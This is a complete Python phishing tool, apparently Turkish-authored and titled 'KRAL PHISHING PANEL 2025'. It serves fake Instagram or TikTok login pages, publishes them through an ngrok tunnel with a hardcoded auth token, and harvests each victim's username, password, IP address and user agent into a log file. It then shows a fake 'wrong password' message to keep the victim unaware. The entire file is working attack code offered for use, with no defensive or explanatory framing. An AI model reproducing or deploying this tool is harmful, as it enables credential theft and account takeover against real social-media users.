import os
import socket
import threading
import urllib.parse
import requests
import time
import winsound
from http.server import SimpleHTTPRequestHandler, HTTPServer
from pyngrok import ngrok

def vommit_ses():
    try:
        for _ in range(6):
            winsound.Beep(884, 200)
            winsound.Beep(1768, 400)
        winsound.Beep(3520, 1200)
    except: pass

# BURAYA GLOBAL DEĞİŞKENLERİ TAŞIDIK (Handler bunları görsün diye)
SECILEN_KLASOR = ""
SECILEN_ISIM = ""

def run():
    global SECILEN_KLASOR, SECILEN_ISIM

    print("="*70)
    print("        KRAL PHISHING PANEL 2025 - TAM ÇALIŞIYOR")
    print("="*70)

    ngrok.set_auth_token("35Bi9jSEWfaAGN6pxln6FIiALKT_52uSWnRDf1tuV5QNufWtA")

    print("\n[1] Instagram")
    print("[2] TikTok 2025 (Rusça + CSS)")
    secim = input("\nSeç → ").strip()

    if secim == "2":
        SECILEN_KLASOR = os.path.join(os.path.dirname(__file__), "templates", "tiktok")
        SECILEN_ISIM = "TIKTOK"
    else:
        SECILEN_KLASOR = os.path.join(os.path.dirname(__file__), "templates", "instagram")
        SECILEN_ISIM = "INSTAGRAM"

    print(f"\n{SECILEN_ISIM} BAŞLATILIYOR...")

    s = socket.socket()
    s.bind(('', 0))
    port = s.getsockname()[1]
    s.close()

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=SECILEN_KLASOR, **kwargs)

        def do_POST(self):
            if self.path not in ["/", "/post.php", "/index.html"]:
                self.send_error(404)
                return

            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", errors="ignore")
            data = urllib.parse.parse_qs(body)
            user = data.get("username", [""])[0]
            pw   = data.get("password", [""])[0]
            ip   = self.client_address[0]
            ua   = self.headers.get("User-Agent", "Bilinmiyor")

            print(f"\nGİRİŞ → [{SECILEN_ISIM}] {user}:{pw} | {ip}")

            os.makedirs("logs", exist_ok=True)
            with open("logs/captured.txt", "a", encoding="utf-8") as f:
                f.write(f"{'='*60}\n")
                f.write(f"[{time.ctime()}]\n")
                f.write(f"PLATFORM → {SECILEN_ISIM}\n")
                f.write(f"KULLANICI → {user}\n")
                f.write(f"ŞİFRE    → {pw}\n")
                f.write(f"IP       → {ip}\n")
                f.write(f"USER-AGENT → {ua}\n")
                f.write(f"{'='*60}\n\n")

            vommit_ses()

            self.send_response(200)
            self.end_headers()
            self.wfile.write("<script>alert('Неверный пароль');setTimeout(()=>location='/',2000);</script>".encode("utf-8"))

        def log_message(self, *a): pass

    threading.Thread(target=HTTPServer(("", port), Handler).serve_forever, daemon=True).start()
    time.sleep(2)

    tunnel = ngrok.connect(port, "http")
    print("\n" + "="*70)
    print(f"   LİNK → {tunnel.public_url}")
    print(f"   SEÇİLEN → {SECILEN_ISIM} (artık doğru çıkıyor)")
    print("="*70)
    input("\nKapatmak için ENTER...")

    ngrok.disconnect(tunnel.public_url)

if __name__ == "__main__":
    run()
    